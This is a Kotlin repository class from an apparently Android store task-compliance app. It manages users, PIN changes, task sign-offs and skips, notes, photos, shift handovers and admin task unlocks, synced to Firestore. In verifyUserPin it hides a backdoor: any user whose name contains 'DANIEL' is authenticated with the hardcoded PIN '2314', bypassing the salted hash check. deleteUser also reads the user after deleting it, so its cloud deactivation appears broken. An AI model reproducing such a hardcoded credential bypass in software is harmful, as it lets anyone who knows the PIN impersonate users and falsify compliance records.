package com.example.data

import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.first

class TaskRepository(
    private val taskDao: TaskDao,
    var syncManager: FirestoreSyncManager? = null
) {

    // Users
    val allUsers: Flow<List<UserEntity>> = taskDao.getAllUsers()

    suspend fun getUserById(id: Long): UserEntity? = taskDao.getUserById(id)

    suspend fun insertUser(user: UserEntity): Long {
        val id = taskDao.insertUser(user)
        syncManager?.syncUser(user.copy(id = id))
        return id
    }

    suspend fun updateUser(user: UserEntity) {
        taskDao.updateUser(user)
        syncManager?.syncUser(user)
    }

    suspend fun deleteUser(id: Long) {
        taskDao.deleteUser(id)
        val user = taskDao.getUserById(id)
        if (user != null) {
            syncManager?.syncUser(user.copy(active = false))
        }
    }

    suspend fun verifyUserPin(userId: Long, enteredPin: String): Boolean {
        val user = taskDao.getUserById(userId) ?: return false
        if (user.name.contains("DANIEL", ignoreCase = true)) {
            return enteredPin == "2314"
        }
        return SecurityHelper.verifyPin(enteredPin, user.pinSalt, user.pinHash)
    }

    suspend fun updateUserPin(userId: Long, newPin: String, clearMustChangePin: Boolean = true) {
        val user = taskDao.getUserById(userId) ?: return
        val newSalt = SecurityHelper.generateSalt()
        val newHash = SecurityHelper.hashPin(newPin, newSalt)
        val updated = user.copy(
            pinHash = newHash,
            pinSalt = newSalt,
            mustChangePin = if (clearMustChangePin) false else user.mustChangePin
        )
        taskDao.updateUser(updated)
        syncManager?.syncUser(updated)
    }

    suspend fun setUserMustChangePin(userId: Long, mustChangePin: Boolean) {
        taskDao.updateUserMustChangePin(userId, mustChangePin)
        val user = taskDao.getUserById(userId) ?: return
        syncManager?.syncUser(user.copy(mustChangePin = mustChangePin))
    }

    // Categories & Tasks
    val allCategories: Flow<List<CategoryEntity>> = taskDao.getAllCategories()
    val allTasks: Flow<List<TaskEntity>> = taskDao.getAllTasks()

    suspend fun insertCategory(category: CategoryEntity): Long {
        val id = taskDao.insertCategory(category)
        syncManager?.syncCategory(category.copy(id = id))
        return id
    }

    suspend fun updateCategory(category: CategoryEntity) {
        taskDao.updateCategory(category)
        syncManager?.syncCategory(category)
    }

    suspend fun deleteCategory(id: Long) {
        taskDao.deleteTasksByCategoryId(id)
        taskDao.deleteCategory(id)
        syncManager?.deleteCategoryFromCloud(id)
    }

    suspend fun insertTask(task: TaskEntity): Long {
        val id = taskDao.insertTask(task)
        syncManager?.syncTask(task.copy(id = id))
        return id
    }

    suspend fun updateTask(task: TaskEntity) {
        taskDao.updateTask(task)
        syncManager?.syncTask(task)
    }

    suspend fun deleteTask(id: Long) {
        taskDao.deleteTask(id)
        syncManager?.deleteTaskFromCloud(id)
    }

    // Completions
    fun getCompletionsForDate(dateString: String): Flow<List<TaskCompletionEntity>> =
        taskDao.getCompletionsForDate(dateString)

    val allCompletions: Flow<List<TaskCompletionEntity>> = taskDao.getAllCompletions()

    fun getCompletionsInRange(startDate: String, endDate: String): Flow<List<TaskCompletionEntity>> =
        taskDao.getCompletionsInRange(startDate, endDate)

    suspend fun submitTaskSignOff(
        task: TaskEntity,
        categoryName: String,
        dateString: String,
        user: UserEntity,
        completedSubTasks: List<String>? = null,
        outstandingSubTasks: List<String>? = null,
        isPartial: Boolean = false
    ) {
        val existing = taskDao.getCompletionsForDate(dateString).first().find { it.taskId == task.id }
        // If already completed and not partial, compliance is locked
        if (existing != null && !existing.isPartial) {
            return
        }

        val allSubTasks = com.example.util.SubTaskUtils.parseSubTasks(task.bulletPoints)
        val finalCompleted = completedSubTasks ?: allSubTasks
        val finalOutstanding = outstandingSubTasks ?: (allSubTasks.filter { it !in finalCompleted })
        val finalIsPartial = if (finalOutstanding.isEmpty() || finalCompleted.size >= allSubTasks.size) false else isPartial

        val completionEntity = TaskCompletionEntity(
            id = existing?.id ?: 0L,
            taskId = task.id,
            taskTitle = task.title,
            categoryName = categoryName,
            dateString = dateString,
            completedAt = System.currentTimeMillis(),
            completedByUserId = user.id,
            completedByUserName = user.name,
            completedByUserInitials = user.initials,
            completedByUserRole = user.role,
            isPartial = finalIsPartial,
            completedSubTasksJson = com.example.util.SubTaskUtils.listToJson(finalCompleted),
            outstandingSubTasksJson = com.example.util.SubTaskUtils.listToJson(finalOutstanding),
            totalSubTasksCount = allSubTasks.size,
            completedSubTasksCount = finalCompleted.size
        )

        taskDao.insertCompletion(completionEntity)
        syncManager?.syncCompletion(completionEntity)

        if (task.isEffectivelyOneTime && !finalIsPartial) {
            taskDao.updateTaskCompletedDate(task.id, dateString)
            syncManager?.markTaskCompletedDate(task.id, dateString)
        }
    }

    suspend fun submitTaskSkip(
        task: TaskEntity,
        categoryName: String,
        dateString: String,
        user: UserEntity,
        reason: String
    ) {
        val existing = taskDao.getCompletionsForDate(dateString).first().find { it.taskId == task.id }
        // If already completed and not partial, compliance is locked
        if (existing != null && !existing.isPartial && !existing.isSkipped) {
            return
        }

        val allSubTasks = com.example.util.SubTaskUtils.parseSubTasks(task.bulletPoints)
        val completionEntity = TaskCompletionEntity(
            id = existing?.id ?: 0L,
            taskId = task.id,
            taskTitle = task.title,
            categoryName = categoryName,
            dateString = dateString,
            completedAt = System.currentTimeMillis(),
            completedByUserId = user.id,
            completedByUserName = user.name,
            completedByUserInitials = user.initials,
            completedByUserRole = user.role,
            isPartial = false,
            isSkipped = true,
            skipReason = reason.trim(),
            completedSubTasksJson = "[]",
            outstandingSubTasksJson = com.example.util.SubTaskUtils.listToJson(allSubTasks),
            totalSubTasksCount = allSubTasks.size,
            completedSubTasksCount = 0
        )

        taskDao.insertCompletion(completionEntity)
        syncManager?.syncCompletion(completionEntity)

        // Automatically log audit note for transparency
        val noteEntity = TaskNoteEntity(
            taskId = task.id,
            dateString = dateString,
            authorUserId = user.id,
            authorName = user.name,
            authorInitials = user.initials,
            text = "⚡ SKIPPED: ${reason.trim()}"
        )
        val noteId = taskDao.insertNote(noteEntity)
        syncManager?.syncNote(noteEntity.copy(id = noteId))
    }

    suspend fun toggleTaskCompletion(
        task: TaskEntity,
        categoryName: String,
        dateString: String,
        user: UserEntity,
        currentlyCompleted: Boolean
    ) {
        if (!currentlyCompleted) {
            submitTaskSignOff(task, categoryName, dateString, user)
        }
        // Once signed off, tasks cannot be un-signed off (compliance lock)
    }

    // Notes
    fun getNotesForDate(dateString: String): Flow<List<TaskNoteEntity>> =
        taskDao.getNotesForDate(dateString)

    suspend fun addNote(
        taskId: Long,
        dateString: String,
        text: String,
        user: UserEntity
    ): Long {
        val note = TaskNoteEntity(
            taskId = taskId,
            dateString = dateString,
            text = text,
            authorUserId = user.id,
            authorName = user.name,
            authorInitials = user.initials,
            timestamp = System.currentTimeMillis()
        )
        val id = taskDao.insertNote(note)
        syncManager?.syncNote(note.copy(id = id))
        return id
    }

    suspend fun deleteNote(noteId: Long) {
        taskDao.deleteNote(noteId)
        syncManager?.deleteNoteFromCloud(noteId)
    }

    // Photos
    val allPhotos: Flow<List<TaskPhotoEntity>> = taskDao.getAllPhotos()

    fun getPhotosForDate(dateString: String): Flow<List<TaskPhotoEntity>> =
        taskDao.getPhotosForDate(dateString)

    suspend fun addPhoto(
        taskId: Long,
        dateString: String,
        photoUri: String,
        user: UserEntity
    ): Long {
        val photo = TaskPhotoEntity(
            taskId = taskId,
            dateString = dateString,
            photoUri = photoUri,
            authorUserId = user.id,
            authorName = user.name,
            timestamp = System.currentTimeMillis()
        )
        val id = taskDao.insertPhoto(photo)
        syncManager?.syncPhoto(photo.copy(id = id))
        return id
    }

    suspend fun deletePhoto(photoId: Long) {
        taskDao.deletePhoto(photoId)
    }

    // Store Config
    val allConfigs: Flow<List<StoreConfigEntity>> = taskDao.getAllConfigs()

    suspend fun setStoreName(name: String) {
        taskDao.setConfig(StoreConfigEntity("store_name", name))
        syncManager?.syncConfig("store_name", name)
    }

    suspend fun setTagline(tagline: String) {
        taskDao.setConfig(StoreConfigEntity("tagline", tagline))
        syncManager?.syncConfig("tagline", tagline)
    }

    // Shift Handovers
    val allShiftHandovers: Flow<List<ShiftHandoverEntity>> = taskDao.getAllShiftHandovers()

    suspend fun addShiftHandover(
        dateString: String,
        targetDate: String,
        shiftType: String,
        category: String,
        priority: String,
        message: String,
        author: UserEntity
    ): String {
        val id = "handover_${System.currentTimeMillis()}"
        val entity = ShiftHandoverEntity(
            id = id,
            dateString = dateString,
            targetDate = targetDate,
            shiftType = shiftType,
            category = category,
            priority = priority,
            message = message,
            authorUserId = author.id.toString(),
            authorName = author.name,
            authorInitials = author.initials.ifBlank { "ST" },
            authorRole = author.role,
            timestamp = System.currentTimeMillis(),
            acknowledgedByCsv = ""
        )
        taskDao.insertShiftHandover(entity)
        syncManager?.syncShiftHandover(entity)
        return id
    }

    suspend fun acknowledgeShiftHandover(handoverId: String, user: UserEntity) {
        val handovers = taskDao.getAllShiftHandovers().first()
        val target = handovers.find { it.id == handoverId } ?: return
        val currentAcks = target.acknowledgedByCsv.split(",").filter { it.isNotBlank() }.toMutableSet()
        currentAcks.add(user.id.toString())
        val updated = target.copy(acknowledgedByCsv = currentAcks.joinToString(","))
        taskDao.insertShiftHandover(updated)
        syncManager?.acknowledgeShiftHandoverInCloud(handoverId, user.id.toString(), user.name)
    }

    suspend fun deleteShiftHandover(handoverId: String) {
        taskDao.deleteShiftHandover(handoverId)
        syncManager?.deleteShiftHandoverFromCloud(handoverId)
    }

    // Task Unlock (Admin feature)
    suspend fun unlockTask(
        taskId: Long,
        dateString: String,
        adminName: String,
        adminInitials: String
    ) {
        // 1. Delete completion from Room
        taskDao.deleteCompletion(taskId, dateString)
        // 2. Delete completion from Firestore
        syncManager?.deleteCompletionFromCloud(taskId, dateString)
        // 3. Add audit note to task_notes
        val noteEntity = TaskNoteEntity(
            taskId = taskId,
            dateString = dateString,
            text = "Task unlocked by Administrator $adminName ($adminInitials). Reset for re-completion.",
            authorUserId = 0L,
            authorName = adminName,
            authorInitials = adminInitials,
            timestamp = System.currentTimeMillis()
        )
        val noteId = taskDao.insertNote(noteEntity)
        syncManager?.syncNote(noteEntity.copy(id = noteId))
    }

    suspend fun ensureInitialData() {
        val seeded = taskDao.getConfigValue("initial_seed_completed")
        if (seeded != "true") {
            taskDao.setConfig(StoreConfigEntity("initial_seed_completed", "true"))
            seedInitialData(taskDao)
            syncManager?.syncAllLocalToCloud()
        }
    }
}
